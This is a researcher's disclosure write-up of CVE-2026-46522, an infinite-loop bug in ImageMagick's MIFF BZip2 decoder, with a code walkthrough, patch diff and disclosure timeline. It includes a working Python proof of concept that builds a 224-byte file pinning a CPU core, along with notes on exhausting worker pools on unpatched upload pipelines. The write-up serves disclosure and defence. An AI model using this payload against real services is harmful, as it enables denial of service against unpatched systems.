# CVE-2026-46522: A 224-byte MIFF that pins ImageMagick at 100% CPU

ImageMagick's MIFF reader has an infinite loop in its BZip2 decompression branch. A 224-byte file is enough to pin a worker at 100% CPU until something external kills it. Silent. Pre-auth. Single request.

- **GHSA:** [GHSA-7gg8-qqx7-92g5](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-7gg8-qqx7-92g5)
- **CVE:** CVE-2026-46522
- **Severity:** 7.5 High (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
- **Patched in:** ImageMagick 7.1.2-23 and 6.9.13-48
- **Class:** CWE-835 (Loop with Unreachable Exit Condition) + CWE-400

---

## How I got here

Last week, the ImageMagick team patched [GHSA-jcqp-6r6f-3mfx](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-jcqp-6r6f-3mfx), a write-side bug in `coders/miff.c`'s LZMA branch. The patch touched two things:

1. A missing `LZMAMaxExtent` in a buffer-size computation.
2. A `status` flag set to `MagickTrue` in an error path that should have left it false.

I was reading the patch and got curious. Both bugs lived in `WriteMIFFImage`. The read path, `ReadMIFFImage`, has the exact same shape: three decompression branches (BZip, LZMA, Zip), each with its own length prefix and decompression loop. If two bugs slipped past review on the write side, what about the read side?

I wrote down a hypothesis:

> **H001:** `ReadMIFFImage` has adjacent bugs to the recent `WriteMIFFImage` patch. Specifically: (a) the same missing-MaxExtent buffer issue, and (b) the same status-flag direction mistake.

Both predictions turned out to be wrong. The read side already had `MagickMax(BZipMaxExtent, LZMAMaxExtent, ZipMaxExtent)` accounting for all three compressors. And the `status = MagickTrue` assignments in the read loop are intentional initializations, not error-path bugs.

But I kept reading the same region of code, and that's where I found it.

## The bug

`coders/miff.c`, line ~1484, BZip branch of the per-row decompression switch:

```c
case BZipCompression:
{
  bzip_info.next_out = (char *) pixels;
  bzip_info.avail_out = (unsigned int) (packet_size*image->columns);
  do
  {
    int code;
    if (bzip_info.avail_in == 0)
    {
      bzip_info.next_in = (char *) compress_pixels;
      length = (size_t) BZipMaxExtent(packet_size*image->columns);
      if (version != 0.0)
        length = (size_t) ReadBlobMSBLong(image);   /* attacker-controlled */
      if (length <= compress_extent)
        bzip_info.avail_in = (unsigned int) ReadBlob(image,length,
          (unsigned char *) bzip_info.next_in);
      if ((length > compress_extent) ||
          ((size_t) bzip_info.avail_in != length))
      {
        (void) BZ2_bzDecompressEnd(&bzip_info);
        ThrowMIFFException(CorruptImageError,"UnableToReadImageData");
      }
    }
    code = BZ2_bzDecompress(&bzip_info);
    if ((code != BZ_OK) && (code != BZ_STREAM_END))
    {
      status = MagickFalse;
      break;
    }
    if (code == BZ_STREAM_END)
      break;
  } while (bzip_info.avail_out != 0);
  ...
}
```

The `length` field is a 4-byte big-endian integer read straight from the file, fully attacker-controlled. Set it to zero and watch what happens:

1. `length = ReadBlobMSBLong(image) = 0`.
2. `length <= compress_extent` is true → `ReadBlob(image, 0, ...)` returns 0 instantly. `bzip_info.avail_in` becomes 0.
3. The trap check evaluates `(0 > compress_extent) || (0 != 0)`. Both false. **No exception.**
4. `BZ2_bzDecompress` is called with `avail_in = 0`. Per the libbz2 contract, this returns `BZ_OK` silently. The library is saying "feed me more data, no progress made."
5. The IM loop checks `(code != BZ_OK) && (code != BZ_STREAM_END)`. `BZ_OK` is neither end-of-stream nor an error, so the loop continues.
6. `avail_out` is unchanged (no output produced), so the `while (avail_out != 0)` condition stays true.
7. Next iteration: `avail_in == 0` again. Either more zero-length prefixes are read, or `ReadBlobMSBLong` returns 0 after EOF. Either way, `length` stays 0 forever.

Infinite loop. Tight. No memory growth, no log lines, just one CPU core pinned.

## Why only BZip2?

The same pattern exists in the LZMA and Zip branches a few hundred lines below. Both *should* be vulnerable on first read, but they aren't, and the difference is interesting.

**LZMA branch** (~line 1525):

```c
if (code != LZMA_OK) { status = MagickFalse; break; }
```

`lzma_code(stream, LZMA_RUN)` with `avail_in = 0` returns `LZMA_BUF_ERROR`. Not `LZMA_OK`. Loop exits.

**Zip branch** (~line 1565):

```c
if ((code != Z_OK) && (code != Z_STREAM_END)) { status = MagickFalse; break; }
```

`inflate(stream, Z_SYNC_FLUSH)` with `avail_in = 0` returns `Z_BUF_ERROR`. Not `Z_OK`, not `Z_STREAM_END`. Loop exits.

**BZip2** is the only library of the three that **silently** returns its success code on empty input. From the libbz2 API contract this is documented behavior: `BZ2_bzDecompress` returning `BZ_OK` with no progress is a legitimate "feed me more" signal. The caller is responsible for not calling it in a loop on empty input.

The IM caller doesn't know about that subtlety. It treats `BZ_OK` as "all good, keep going."

So: **a single-library contract difference between three otherwise-identical loops becomes a security bug in one of them.** Worth filing under "interesting taxonomy."

## The PoC, 224 bytes

```python
header = (
    b"id=ImageMagick version=1.0\n"
    b"class=DirectClass colors=0 alpha-trait=Undefined\n"
    b"number-channels=3 number-meta-channels=0 channel-mask=0x0000000000000007\n"
    b"columns=1 rows=1 depth=8\n"
    b"colorspace=sRGB compression=BZip quality=75\n"
    b"\x0c\n"               # form feed terminator + the byte ReadBlobByte consumes
)
body = b"\x00\x00\x00\x00"  # 4-byte big-endian length = 0
open("/tmp/poc.miff", "wb").write(header + body)
```

Trigger:

```text
$ /usr/bin/time -f 'wall=%es user=%Us cpu=%P exit=%x' \
    timeout 5 magick identify /tmp/poc.miff

Command exited with non-zero status 124
wall=5.00s user=5.00s cpu=100% exit=124
```

Process never finishes on its own. Scaling is linear with the timeout:

```text
T=1s  → wall=1.00s   user=1.00s   cpu=99%
T=3s  → wall=3.00s   user=3.00s   cpu=100%
T=5s  → wall=5.00s   user=5.00s   cpu=99%
T=10s → wall=10.01s  user=10.01s  cpu=99%
```

RSS stays under 10 MB. Nothing on stdout or stderr. The worker isn't crashing, it's just gone, busy looping.

## The patch

One missing check. Reject `length == 0` after the existing trap, before calling into libbz2:

```diff
--- a/coders/miff.c
+++ b/coders/miff.c
@@ -1497,11 +1497,16 @@ static Image *ReadMIFFImage(const ImageInfo *image_info,
            if ((length > compress_extent) ||
                ((size_t) bzip_info.avail_in != length))
              {
                (void) BZ2_bzDecompressEnd(&bzip_info);
                ThrowMIFFException(CorruptImageError,
                  "UnableToReadImageData");
              }
+           if (length == 0)
+             {
+               (void) BZ2_bzDecompressEnd(&bzip_info);
+               ThrowMIFFException(CorruptImageError,"UnexpectedEndOfFile");
+             }
          }
        code = BZ2_bzDecompress(&bzip_info);
```

I recommended adding the same defensive check to the LZMA and Zip branches even though those libraries currently bail out. Consistency reduces surprise if a future library version changes contract.

## Real-world impact

MIFF is ImageMagick's native format and is auto-detected through two channels:

1. **Filename**: `.miff`, `.mif` extensions.
2. **Magic bytes**: any file whose first bytes are `id=ImageMagick` is parsed as MIFF, **regardless of filename or MIME**.

The second channel is the dangerous one. Pipelines that whitelist by extension (`.jpg`, `.png`, `.gif`) **still pass MIFF content through** if they let the magic-byte detector decide. Which is what `magick`, `convert`, and `identify` do by default.

Concretely affected pipelines:

- CMS uploaders (WordPress, Drupal, Ghost, etc.)
- Profile picture services
- E-commerce image handlers
- Email attachment scanners
- Serverless thumbnailers
- Ruby uploaders (Carrierwave, Dragonfly, Active Storage)
- .NET pipelines using Magick.NET
- Anything that runs `identify` or `convert` on user-supplied data

**Attack profile**:

- Pre-auth
- 1 request
- 224 bytes
- No memory growth → OOM killers don't catch it
- No log output → SOC doesn't notice it

The only thing that frees the worker is a request timeout or an external SIGKILL. Once the timeout fires, the worker is back. Repeat the request → another worker burns. Saturate the pool → service stops accepting new work.

## Disclosure timeline

| Date         | Event                                                         |
|--------------|---------------------------------------------------------------|
| 2026-05-13   | Found and verified on stock 7.1.2-3 and master `188fcf5`      |
| 2026-05-13   | Reported via GitHub Security Advisory                         |
| 2026-05-17   | Patch released in 7.1.2-23 and 6.9.13-48                      |
| 2026-05-17   | Advisory published: GHSA-7gg8-qqx7-92g5 / CVE-2026-46522      |
| 2026-05-17   | This post                                                     |

Fast triage and turnaround from the ImageMagick team. From report to public advisory in four days.

## Links

- Advisory: [GHSA-7gg8-qqx7-92g5](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-7gg8-qqx7-92g5)
- CVE: CVE-2026-46522
- ImageMagick: https://github.com/ImageMagick/ImageMagick
- libbz2 API contract on `BZ2_bzDecompress`: https://sourceware.org/bzip2/manual/manual.html#bzdecompress
- CWE-835: https://cwe.mitre.org/data/definitions/835.html
- CWE-400: https://cwe.mitre.org/data/definitions/400.html
